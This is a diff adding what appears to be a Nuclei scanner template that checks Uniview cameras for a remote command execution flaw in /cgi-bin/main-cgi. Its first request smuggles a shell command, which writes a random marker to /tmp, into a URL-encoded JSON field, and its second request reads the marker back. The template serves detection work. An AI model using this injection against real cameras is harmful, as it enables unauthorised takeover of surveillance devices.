@@ -1,0 +1,48 @@
+id: uniview-cameras-main-cgi-rce
+
+info:
+  name: Uniview Cameras main.cgi RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    There is a remote command execution vulnerability in many Uniview Cameras and Surveillance systems, allowing attackers to forge specific messages and execute system commands.
+  tags: rce
+  reference:
+    - https://gobies.org/
+
+variables:
+  randStr: '{{rand_base(16)}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: check-rce
+    raw:
+      - |
+        GET /cgi-bin/main-cgi?json=%7b%22cmd%22%3a264%2c%22status%22%3a1%2c%22bSelectAllPort%22%3a1%2c%22stSelPort%22%3a0%2c%22bSelectAllIp%22%3a1%2c%22stSelIp%22%3a0%2c%22stSelNicName%22%3a%22%3becho+{{randStr}}+%3e+%2Ftmp%2Fpacketcapture.pcap%3b%22%7d HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: validate-rce
+    raw:
+      - |
+        GET /cgi-bin/main-cgi?json=%7b%22cmd%22%3a265%2c%22szUserName%22%3a%22%22%2c%22u32UserLoginHandle%22%3a-1%7d HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{randStr}}"
+        part: body
